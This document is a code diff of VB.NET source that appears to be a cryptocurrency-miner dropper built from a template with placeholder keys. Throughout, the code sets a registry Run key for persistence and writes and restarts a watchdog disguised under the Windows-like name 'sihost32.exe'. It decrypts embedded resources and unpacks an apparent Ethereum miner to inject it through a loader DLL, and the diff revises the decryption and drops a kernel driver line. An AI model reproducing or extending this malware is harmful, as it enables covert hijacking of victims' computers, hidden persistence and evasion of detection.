@@ -44,6 +44,9 @@ Public Class Program
         Registry.CurrentUser.CreateSubKey(GetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
         Install()
 #End If
+#If INS And Not WD Then
+        Process.Start(PayloadPath)
+#End If
         Initialize()
     End Sub
 
@@ -70,8 +73,7 @@ Public Class Program
 #End If
 
     Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
-        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
-        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
+        Dim MyResource As New Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly())
         Return AES_Decryptor(MyResource.GetObject(Get_))
     End Function
 
@@ -94,20 +96,18 @@ Public Class Program
             Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))
 
 #If WD Then
-                    For Each proc As Process In Process.GetProcessesByName("sihost64")
+                    For Each proc As Process In Process.GetProcessesByName("sihost32")
                         proc.Kill()
                     Next
 
                     Threading.Thread.Sleep(3000)
 
-                    System.IO.File.WriteAllBytes(bD & "sihost64.exe", GetTheResource("#watchdog"))
+                    System.IO.File.WriteAllBytes(bD & "sihost32.exe", GetTheResource("#watchdog"))
 
-                    If Process.GetProcessesByName("sihost64").Length < 1 Then
-                        Process.Start(bD & "sihost64.exe")
+                    If Process.GetProcessesByName("sihost32").Length < 1 Then
+                        Process.Start(bD & "sihost32.exe")
                     End If
 #End If
-
-            System.IO.File.WriteAllBytes(bD & "WR64.sys", GetTheResource("#winring"))
         Catch ex As Exception
         End Try
     End Sub
@@ -139,55 +139,48 @@ Public Class Program
         End If
 
         Try
-            Dim x As Byte() = GetTheResource("#eth")
-            Dim xm As Byte() = New Byte() {}
             Dim rS As String = ""
 
             BaseFolder()
 
-            Try
-                Try
-                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
-                        For Each entry As ZipArchiveEntry In archive.Entries
-                            If entry.FullName.Contains("et") Then
-                                Using streamdata As Stream = entry.Open()
-                                    Using ms = New MemoryStream()
-                                        streamdata.CopyTo(ms)
-                                        xm = ms.ToArray
-                                    End Using
-                                End Using
-                            End If
-                        Next
-                    End Using
-                Catch ex As Exception
-                End Try
-
-            Catch ex As Exception
-            End Try
             Dim argstr As String = GetString("#ARGSTR") + rS
             argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
             argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10))
             KillLastProc()
-            Run(GetTheResource("#dll"), argstr, xm)
+            Try
+                Using archive As ZipArchive = New ZipArchive(New MemoryStream(GetTheResource("#eth")))
+                    For Each entry As ZipArchiveEntry In archive.Entries
+                        If entry.FullName.Contains("et") Then
+                            Using streamdata As Stream = entry.Open()
+                                Using ms = New MemoryStream()
+                                    streamdata.CopyTo(ms)
+                                    Run(GetTheResource("#dll"), argstr, ms.ToArray)
+                                End Using
+                            End Using
+                        End If
+                    Next
+                End Using
+            Catch ex As Exception
+            End Try
         Catch ex As Exception
         End Try
     End Sub
 
     Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
-        Dim AES As New RijndaelManaged
-        Dim Hash_ As New MD5CryptoServiceProvider
-        Try
-            Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_.ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
-            Array.Copy(temp, 0, hash, 0, 16)
-            Array.Copy(temp, 0, hash, 15, 16)
-            AES.Key = hash
-            AES.Mode = CipherMode.ECB
-            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
-            Dim Buffer As Byte() = input
-            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
-        Catch ex As Exception
-        End Try
+        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes("#IV")
+        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes("#SALT")
+        Dim k1 As New Rfc2898DeriveBytes("#KEY", saltValueBytes, 100)
+        Dim symmetricKey As New RijndaelManaged
+        symmetricKey.KeySize = 256
+        symmetricKey.Mode = CipherMode.CBC
+        Dim decryptor As ICryptoTransform = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes)
+        Using mStream As New MemoryStream()
+            Using cStream As New CryptoStream(mStream, decryptor, CryptoStreamMode.Write)
+                cStream.Write(input, 0, input.Length)
+                cStream.Close()
+            End Using
+            Return mStream.ToArray()
+        End Using
     End Function
 
 End Class
